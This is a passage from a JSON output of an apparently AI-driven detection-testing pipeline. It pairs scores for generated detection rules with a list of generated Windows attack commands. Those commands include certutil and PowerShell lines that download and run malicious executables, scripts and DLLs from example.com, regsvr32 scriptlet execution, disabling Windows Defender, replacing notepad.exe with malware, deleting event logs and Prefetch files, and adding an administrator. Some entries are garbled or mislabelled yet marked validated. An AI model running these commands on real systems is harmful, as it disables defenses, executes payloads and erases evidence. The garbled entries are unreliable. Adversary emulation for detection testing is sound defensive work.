          "Verify the rule in a real-world environment to assess its detection coverage and false positive rate",
          "Refine the detection logic to reduce false positives, such as excluding specific processes or commands used for legitimate purposes",
          "Add more specific TTP information to the rule, such as tactics or techniques used in conjunction with archiving collected data"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Timestomping Detection via File Attribute Modification",
        "rule_id": "30edc82c-50d8-483f-92b4-d4f00c1635db",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique (timestomping) and includes multiple selections to cover various tools and utilities",
          "It provides a clear description and includes relevant tags and IDs for easy identification"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world scenario, which raises concerns about its effectiveness",
          "It may generate false positives due to legitimate system administration activities",
          "The rule contains no IPs or domains, but it does not account for potential variations in command-line arguments or tool usage"
        ],
        "suggestions": [
          "Perform real-world verification to validate the rule's effectiveness and identify potential areas for improvement",
          "Consider adding more specific conditions or filters to reduce false positives",
          "Expand the rule to cover additional tools or techniques that may be used for timestomping",
          "Regularly review and update the rule to ensure it remains relevant and effective in detecting emerging threats"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Remote Services Activity via Common Administration Tools and Techniques",
        "rule_id": "8abc22ee-c6da-41a7-a59c-11152bce49c4",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule covers a wide range of remote service utilities and command-line patterns associated with lateral movement",
          "It includes a clear and concise description of the detection logic and the targeted TTP",
          "The rule has a well-structured and organized format, making it easy to understand and maintain"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment, which raises concerns about its effectiveness",
          "The rule may generate false positives due to legitimate administrative use of remote management tools",
          "The rule contains no IPs or domains, but it does not account for potential variations in command-line arguments or utility names"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's detection coverage and false positive rate",
          "Consider adding more specific conditions to reduce false positives, such as filtering out known administrative tools or commands",
          "Regularly review and update the rule to ensure it remains effective against evolving attacker TTPs"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      }
    ],
    "feedback": {
      "timestamp": "2025-12-22T15:49:08.464097",
      "source_agent": "a676fcec-063c-4e2b-9ba7-f65e93c01665",
      "target_agent": "rulegen",
      "average_quality_score": 0.542,
      "total_rules_evaluated": 29,
      "improvements_needed": [
        {
          "metric": "quality",
          "current_value": 0.5424137931034484,
          "target_value": 0.85,
          "suggestion": "Improve overall rule quality"
        }
      ],
      "common_issues": [
        "The rule has not been verified in a real-world environment",
        "The rule has not been verified in a real-world environment, which raises concerns about its effectiveness",
        "The rule has not been verified in a real-world scenario",
        "The rule has not been verified in a real-world scenario, which raises concerns about its effectiveness",
        "No real-world verification was performed to validate the rule's effectiveness"
      ],
      "actionable_suggestions": [
        "Consider adding more specific conditions to reduce false positives",
        "Verify the rule in a real-world environment to assess its detection coverage and false positive rate",
        "Perform real-world verification to assess the rule's detection coverage and false positive rate",
        "Add more specific conditions to reduce false positives",
        "Perform real-world verification to test the rule's effectiveness"
      ]
    }
  },
  "attacks": [
    {
      "id": "a1017185-d7bf-4097-ad66-33004d6134d7",
      "ttp_id": "unknown",
      "technique_id": "T1021",
      "technique_name": "Lateral Movement",
      "tactic": "execution",
      "platform": "windows",
      "command": "net.exe use \\\\\\\\\\\\\\\\/\\/\\/\\/\\\\\\\\\\\\\\\\\\\\\\\\\\!\\/\\/\\/\\/\\\\\\\\\\\\\\\\\\\\\\\\\\!\\\\\\\\\\\\\\\\\\\\\\\\\\!\\/\\/\\\\\\\\\\\\\\\\\\\\\\\\\\/\\\\\\\\\\\\\\\\\\\\\\\\\\!\\/\\/\\\\\\\\\\\\\\\\\\\\\\\\\\!\\/\\/\\/\\/\\\\\\\\\\\\\\\\\\\\\\\\\\!\\/\\/\\/\\/\\\\\\\\\\\\\\\\\\\\\\\\\\!\\\\\\\\\\\\\\\\\\\\\\\\\\!\\/\\/\\\\\\\\\\\\\\\\\\\\\\\\\\/\\\\\\\\\\\\\\\\\\\\\\\\\\!\\/\\/\\\\\\\\\\\\\\\\\\\\\\\\\\!",
      "description": "Lateral movement using net.exe with obfuscated UNC path",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Establish a connection to a remote share using an obfuscated UNC path",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:14.356408",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "37bb12c1-f787-4237-b21c-30edc3310cf2",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Lateral Movement",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"&{(New-Object System.Net.WebClient).DownloadString('file:///%TEMP%/test.txt')|iex;Remove-Item -Path '%TEMP%/test.txt' -ErrorAction SilentlyContinue}\"",
      "description": "Lateral movement using PowerShell to download and execute a file from a local temp directory",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Download a file from a local temp directory and execute it using PowerShell",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:14.356408",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f7507332-7cae-4e9d-b896-f85a7768e7d8",
      "ttp_id": "unknown",
      "technique_id": "T1050",
      "technique_name": "Lateral Movement",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc.exe create test binPath= \"C:\\\\\\Windows\\\\\\system32\\\\\\cmd.exe /c echo 'test' > %TEMP%/test.txt\"",
      "description": "Lateral movement using sc.exe to create a service that writes to a file",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "Create a service that writes 'test' to a file in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:14.356408",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5db244a0-afba-4daa-aafb-79888b3a2874",
      "ttp_id": "unknown",
      "technique_id": "T1070",
      "technique_name": "Anti-Forensics",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Get-ChildItem -Path C:\\\\Users\\\\Public\\\\ -Force\"",
      "description": "Basic: Lists files in the Public directory using Get-ChildItem with -Force",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists files in the Public directory",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:15.833237",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c0108f4f-0cef-412d-8481-cc5b13b1e331",
      "ttp_id": "unknown",
      "technique_id": "T1070",
      "technique_name": "Anti-Forensics",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path C:\\\\Users\\\\Public\\\\\\* -DestinationPath C:\\\\Users\\\\Public\\\\archive.zip -Force\"",
      "description": "Intermediate: Archives files in the Public directory using Compress-Archive with -Force",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Archives files in the Public directory",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:15.833237",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7db9b69a-da68-49a0-a333-6ed4b1de6cf4",
      "ttp_id": "unknown",
      "technique_id": "T1070",
      "technique_name": "Anti-Forensics",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Set-Content -Path C:\\\\Users\\\\Public\\\\test.txt -Value 'Test content' -Force; Remove-Item -Path C:\\\\Users\\\\Public\\\\test.txt -Force -ErrorAction SilentlyContinue\"",
      "description": "Advanced: Creates a file, writes to it, and then deletes it using Set-Content and Remove-Item with -Force and -ErrorAction SilentlyContinue",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a file, writes to it, and then deletes it",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:15.833237",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "dc5f76d3-88fb-4e9f-99ad-7fefb306f64e",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "net user /domain",
      "description": "Enumerate domain users using net.exe",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists domain users",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:16.964268",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "79607fce-dd6a-4dce-815a-a2f34330d799",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Write-Host 'Hello World'\"",
      "description": "Execute a simple PowerShell command",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints 'Hello World' to the console",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:16.964268",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "64d24308-4acf-44a3-8336-4bc0a1f9ea94",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -f http://example.com/test.txt %TEMP%\\test.txt && type %TEMP%\\test.txt",
      "description": "Download a file using certutil and display its contents",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file and displays its contents",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:16.964268",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "86d81c6c-5904-495d-a931-1f9a5b1445b9",
      "ttp_id": "unknown",
      "technique_id": "T1068",
      "technique_name": "Exploitation for Privilege Escalation",
      "tactic": "execution",
      "platform": "windows",
      "command": "net localgroup administrators /add testuser",
      "description": "Exploitation for Privilege Escalation via net localgroup",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Adds a new user to the administrators group",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:17.722383",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b110f95a-22ac-446c-825e-1332b1087f76",
      "ttp_id": "unknown",
      "technique_id": "T1068",
      "technique_name": "Exploitation for Privilege Escalation",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-WindowsCapability -Name NetFx3~~ -Source C:\\\\\\\\temp\\\\\\\\NetFx3\\\\\\\\\\\", \"expected_behavior\": \"Installs .NET Framework 3.5\", \"safety_level\": \"medium\", \"requires_admin\": true, \"technique_id\": \"T1068\", \"description\": \"Exploitation for Privilege Escalation via PowerShell\", \"platform\": \"windows\"",
      "description": "Exploitation for Privilege Escalation via PowerShell",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Installs .NET Framework 3.5",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:17.722383",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c35a912d-7d70-4c19-9ff4-77e9bd461f4c",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "Exploitation for Privilege Escalation",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -f -decode %TEMP%\\\\\\\\test.cer %TEMP%\\\\\\\\test.exe",
      "description": "Exploitation for Privilege Escalation via certutil",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Decodes a certificate file to an executable",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:17.722383",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "16de139f-a730-4e47-90a9-266ccfcbc55c",
      "ttp_id": "unknown",
      "technique_id": "T1562.001",
      "technique_name": "Disable or Evade Security Tools",
      "tactic": "execution",
      "platform": "windows",
      "command": "net stop windefend",
      "description": "Stop the Windows Defender service to evade security tools",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Windows Defender service will be stopped",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:18.449272",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "344360a7-d9e8-479d-9ccb-4cf91eaf82cf",
      "ttp_id": "unknown",
      "technique_id": "T1562.001",
      "technique_name": "Disable or Evade Security Tools",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Set-ItemProperty -Path 'HKLM:\\\\Software\\\\Policies\\\\Microsoft\\\\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -Type DWORD -Force\"",
      "description": "Disable Windows Defender using registry modification",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Windows Defender will be disabled",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:18.449272",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b991630f-e459-49a5-aac9-5fd084f2a294",
      "ttp_id": "unknown",
      "technique_id": "T1562.001",
      "technique_name": "Disable or Evade Security Tools",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc config windefend start= disabled",
      "description": "Disable the Windows Defender service using sc.exe",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Windows Defender service will be disabled",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:18.449272",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "cf32e44c-edbf-4b4d-ba0d-0d1d8d33fa33",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "Exploitation of Public-Facing Application",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -f http://example.com/malicious.exe %TEMP%\\malicious.exe && %TEMP%\\malicious.exe",
      "description": "Exploits public certificate software vulnerability using certutil to download and execute a malicious executable",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Downloads and executes a malicious executable from a specified URL",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:19.170865",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "50a71dd4-bedc-4738-b3c2-6373844301a5",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "Exploitation of Public-Facing Application",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri http://example.com/malicious.ps1 -OutFile %TEMP%\\malicious.ps1; Invoke-Command -ScriptBlock { & %TEMP%\\malicious.ps1 }\"",
      "description": "Exploits public certificate software vulnerability using PowerShell to download and execute a malicious script",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads and executes a malicious script from a specified URL",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:19.170865",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4016364f-1901-4046-8c2e-9dbaec5e9b31",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "Exploitation of Public-Facing Application",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Net.WebRequest]::DefaultWebProxy = 0; Invoke-WebRequest -Uri http://example.com/malicious.exe -OutFile %TEMP%\\malicious.exe; Start-Process %TEMP%\\malicious.exe\"",
      "description": "Exploits public certificate software vulnerability using PowerShell to download and execute a malicious executable, bypassing default web proxy",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Downloads and executes a malicious executable from a specified URL, bypassing default web proxy",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:19.170865",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "efcca2a2-978b-40cf-84db-b40006c26fdc",
      "ttp_id": "unknown",
      "technique_id": "T1036",
      "technique_name": "Masquerading",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Rename-Item -Path 'C:\\\\Windows\\\\System32\\\\notepad.exe' -NewName 'notepad.exe.bak' -Force; Copy-Item -Path '%TEMP%\\\\malware.exe' -Destination 'C:\\\\Windows\\\\System32\\\\notepad.exe' -Force\"",
      "description": "Masquerading as system file by renaming the original notepad.exe and replacing it with a malicious executable",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The malicious executable will be executed when the user tries to open notepad.exe",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:21.917453",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4cba2ba3-2fa8-4123-ab50-eedad70d2e0c",
      "ttp_id": "unknown",
      "technique_id": "T1036",
      "technique_name": "Masquerading",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Set-Content -Path 'C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts' -Value '127.0.0.1 example.com' -Force\"",
      "description": "Masquerading as a system file by modifying the hosts file to redirect example.com to localhost",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The hosts file will be modified to redirect example.com to localhost",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:21.917453",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "baac389f-e906-4f1a-a8c1-9cb7730ac449",
      "ttp_id": "unknown",
      "technique_id": "T1036",
      "technique_name": "Masquerading",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path '%TEMP%\\\\malware.exe' -DestinationPath 'C:\\\\Windows\\\\System32\\\\malware.zip' -Force; Rename-Item -Path 'C:\\\\Windows\\\\System32\\\\malware.zip' -NewName 'svchost.zip' -Force\"",
      "description": "Masquerading as a system file by compressing a malicious executable and renaming it to a legitimate system file name",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The malicious executable will be compressed and renamed to a legitimate system file name",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:21.917453",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3cefd1c5-e02f-4470-8c0a-30af6eda2c48",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "Exploitation for Client Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -f -urlcache http://example.com/malicious.dll %TEMP%\\malicious.dll",
      "description": "Exploits certificate software vulnerability to download a malicious DLL",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Downloads a malicious DLL to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:22.532995",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c98d2d0d-6851-4a25-815e-5dab75000253",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Exploitation for Client Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri http://example.com/malicious.ps1 -OutFile %TEMP%\\malicious.ps1; Invoke-Command -ScriptBlock {\\\"%TEMP%\\malicious.ps1\\\"}\"",
      "description": "Exploits certificate software vulnerability to download and execute a malicious PowerShell script",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Downloads and executes a malicious PowerShell script",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:22.532995",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5524e0aa-cb46-4000-afa7-672dfa7acecc",
      "ttp_id": "unknown",
      "technique_id": "T1117",
      "technique_name": "Exploitation for Client Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "regsvr32 /s /u /i:%TEMP%\\malicious.sct scrobj.dll",
      "description": "Exploits certificate software vulnerability to execute a malicious scriptlet",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Executes a malicious scriptlet",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:22.532995",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2f5e5648-919b-43ad-95d7-e60af10eef95",
      "ttp_id": "unknown",
      "technique_id": "T1070",
      "technique_name": "Indicator Removal",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Remove-Item -Path C:\\\\Windows\\\\Prefetch\\\\*.* -Force -ErrorAction SilentlyContinue\"",
      "description": "Remove all Prefetch files using PowerShell",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Removes all Prefetch files, potentially removing indicators of malicious activity",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:23.078034",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "80f146ea-4df0-4e19-a647-6981c65ceb61",
      "ttp_id": "unknown",
      "technique_id": "T1070",
      "technique_name": "Indicator Removal",
      "tactic": "execution",
      "platform": "windows",
      "command": "del /q /f C:\\\\Windows\\\\Prefetch\\\\*.*",
      "description": "Remove all Prefetch files using del command",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Removes all Prefetch files, potentially removing indicators of malicious activity",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:23.078034",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f157cbdf-dd74-428e-a90f-218a42aacefd",
      "ttp_id": "unknown",
      "technique_id": "T1070",
      "technique_name": "Indicator Removal",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Remove-Item -Path C:\\\\Windows\\\\System32\\\\winevt\\\\Logs\\\\*.* -Force -ErrorAction SilentlyContinue\"",
      "description": "Remove all Windows Event Logs using PowerShell",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Removes all Windows Event Logs, potentially removing indicators of malicious activity",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:23.078034",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "412626bb-7d34-4aab-ba23-9dd428d45c6c",
      "ttp_id": "unknown",
      "technique_id": "T1070",
      "technique_name": "Indicator Removal",
      "tactic": "execution",
      "platform": "windows",
      "command": "del /f /q C:\\\\temp\\\\malicious_file.exe",
      "description": "Delete a malicious file using the del command",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The file will be deleted silently",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:23.738848",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "29b8585d-6e96-40ab-bb61-227a21bef555",
      "ttp_id": "unknown",
      "technique_id": "T1070",
      "technique_name": "Indicator Removal",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Remove-Item -Path 'C:\\\\temp\\\\malicious_file.exe' -Force -ErrorAction SilentlyContinue\"",
      "description": "Delete a malicious file using PowerShell",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The file will be deleted silently, and any errors will be ignored",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:23.738848",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "035b95c6-fdcc-4aed-a46c-d455a81ccdbf",
      "ttp_id": "unknown",
      "technique_id": "T1070",
      "technique_name": "Indicator Removal",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& { Remove-Item -Path 'C:\\\\temp\\\\malicious_file.exe' -Force -ErrorAction SilentlyContinue; exit 0 }\"",
      "description": "Delete a malicious file using PowerShell with error handling and exit code",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The file will be deleted silently, any errors will be ignored, and the command will exit with code 0",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:23.738848",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1f32c115-d454-4cda-9d84-4764108bd579",
      "ttp_id": "unknown",
      "technique_id": "T1210",
      "technique_name": "Exploitation of Remote Services",
      "tactic": "execution",
      "platform": "windows",
      "command": "net start rpcss",
      "description": "Start the RPC service to enable remote exploitation",
      "requires_admin": true,
      "safety_level": "low",
      "expected_behavior": "The RPC service will be started, allowing for potential remote exploitation",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:24.367791",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "11ffb0f6-2eb0-4862-a9db-3af9c5ff7ccd",
      "ttp_id": "unknown",
      "technique_id": "T1210",
      "technique_name": "Exploitation of Remote Services",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"&{Add-Type -AssemblyName System.Net; $sock = New-Object System.Net.Sockets.TcpClient('192.168.1.100', 445); $sock.Close()}\",",
      "description": "Establish a TCP connection to a remote host on port 445, simulating lateral movement",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A TCP connection will be established to the remote host, potentially triggering detection rules",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:24.367791",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "37021f27-e128-46cf-b191-8612240f0499",
      "ttp_id": "unknown",
      "technique_id": "T1210",
      "technique_name": "Exploitation of Remote Services",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -f -urlcache -split http://example.com/malicious.dll %TEMP%\\malicious.dll && regsvr32.exe /s /i:%TEMP%\\malicious.dll scrobj.dll",
      "description": "Exploit a certificate software vulnerability for lateral movement by downloading and executing a malicious DLL",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The malicious DLL will be downloaded and executed, potentially leading to lateral movement and detection",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:24.367791",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "52062a5d-2e5c-4686-9205-dba64404ff68",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "Web Service Exploitation",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri http://example.com/malicious.exe -OutFile %TEMP%\\malicious.exe\"",
      "description": "Downloads a malicious executable from a legitimate domain",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:24.848926",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "007e790a-e717-46d5-ab3b-eeba7aae345d",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "Web Service Exploitation",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -f http://example.com/malicious.dll %TEMP%\\malicious.dll",
      "description": "Downloads a malicious DLL from a legitimate domain using certutil",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:24.848926",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "177b8765-420f-48f3-af49-2f2138c8be59",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "Web Service Exploitation",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Net.WebRequest]::DefaultWebProxy = 0; Invoke-WebRequest -Uri http://example.com/malicious.ps1 -OutFile %TEMP%\\malicious.ps1\"",
      "description": "Downloads a malicious PowerShell script from a legitimate domain, bypassing proxy settings",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Downloads a file to the temp directory and bypasses proxy settings",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:24.848926",
      "agent_id": "06bfd229-fc25-49c3-a28f-bdcd2675b0c4",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f9f0d1b4-dcd3-4caa-9968-eaccf0730ab8",
      "ttp_id": "unknown",
      "technique_id": "T1070",
      "technique_name": "File Deletion",
      "tactic": "execution",
      "platform": "windows",
      "command": "del /f /q C:\\\\Users\\\\Public\\\\test.txt",
      "description": "Delete a file using the del command with force and quiet options",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "The file test.txt will be deleted from the Public directory",
      "source": "langchain",
      "generated_at": "2025-12-22T15:25:26.986833",
